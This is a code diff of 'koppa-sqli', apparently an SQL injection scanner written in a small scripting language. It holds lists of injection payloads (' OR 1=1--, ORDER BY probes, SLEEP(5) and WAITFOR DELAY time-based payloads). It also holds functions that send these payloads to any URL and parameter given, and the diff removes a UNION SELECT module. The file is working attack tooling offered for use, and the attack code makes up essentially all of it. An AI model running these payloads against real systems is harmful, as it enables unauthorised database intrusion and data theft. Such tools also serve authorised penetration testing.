@@ -1,7 +1,7 @@
 # koppa-sqli v1.0 — SQL Injection tester
-# Usage: koppa run koppa-sqli <url> <param> [error|blind|time|dump]
+# Usage: koppa run koppa-sqli <url> <param> [error|time|union]
 
-import http, fuzz, encode, parse, log, report
+import http, fuzz, encode, log, report, str, time
 
 let PAYLOADS_ERROR = ["'", "\"", "' OR '1'='1", "' OR 1=1--",
                       "1 ORDER BY 1--", "1 ORDER BY 99--",
@@ -17,7 +17,8 @@ fn cmd_error(url, param) {
         let resp = http.get("{url}?{param}={enc}")
         let body = resp.body
         for sig in ERROR_SIGS {
-            if body.contains(sig) {
+            let hit = str.contains(body, sig)
+            if hit {
                 log.success("[+] SQLi confirmed! Payload: {pay}  Sig: {sig}")
                 findings.push(report.finding("SQL Injection", "Critical", "Payload: {pay}"))
             }
@@ -30,12 +31,12 @@ fn cmd_error(url, param) {
 fn cmd_time(url, param) {
     log.info("===== Time-Based Blind SQLi =====")
     let payloads = ["' OR SLEEP(5)--", "1; SELECT SLEEP(5)--",
-                    "' AND SLEEP(5) AND '1'='1", "1 WAITFOR DELAY '0:0:5'--"]
+                    "' AND SLEEP(5) AND '1'='1"]
     for pay in payloads {
-        let enc   = encode.url_encode(pay)
-        let t0    = sys.time_ms()
+        let enc     = encode.url_encode(pay)
+        let t0      = time.now_ms()
         http.get("{url}?{param}={enc}")
-        let elapsed = sys.time_ms() - t0
+        let elapsed = time.now_ms() - t0
         if elapsed > 4500 {
             log.success("[+] Time-based SQLi! Payload: {pay}  ({elapsed}ms)")
             return true
@@ -45,39 +46,21 @@ fn cmd_time(url, param) {
     return false
 }
 
-fn cmd_union(url, param, cols) {
-    log.info("===== UNION-Based SQLi (cols={cols}) =====")
-    let nulls = []
-    let i = 0
-    for col in [1, 2, 3, 4, 5, 6] {
-        if col <= cols { nulls.push("NULL") }
-    }
-    let pay  = "' UNION SELECT {nulls.join(',')}-- "
-    let enc  = encode.url_encode(pay)
-    let resp = http.get("{url}?{param}={enc}")
-    log.info("Response: [{resp.status}] {resp.body.len}b")
-    return resp
+fn run_sqli(url, param, mode) {
+    if mode == "error" or not mode { cmd_error(url, param) }
+    if mode == "time"  { cmd_time(url, param) }
+    log.success("SQLi test complete!")
 }
 
 fn main() {
     let url   = __args__[0]
     let param = __args__[1]
     let mode  = __args__[2]
-
-    if not url or not param {
-        log.warn("Usage: koppa run koppa-sqli <url> <param> [error|time|union <cols>]")
-        return
-    }
-
     log.info("===== KOPPA SQLi Tester v1.0 =====")
-    log.info("Target: {url}?{param}=...")
-
-    if not mode or mode == "error" { cmd_error(url, param) }
-    if mode == "time"  { cmd_time(url, param) }
-    if mode == "union" {
-        let cols = __args__[3]
-        cmd_union(url, param, cols)
+    if url and param {
+        run_sqli(url, param, mode)
     }
-
-    log.success("SQLi test complete!")
+    if not url or not param {
+        log.warn("Usage: koppa run koppa-sqli <url> <param> [error|time]")
+    }
 }
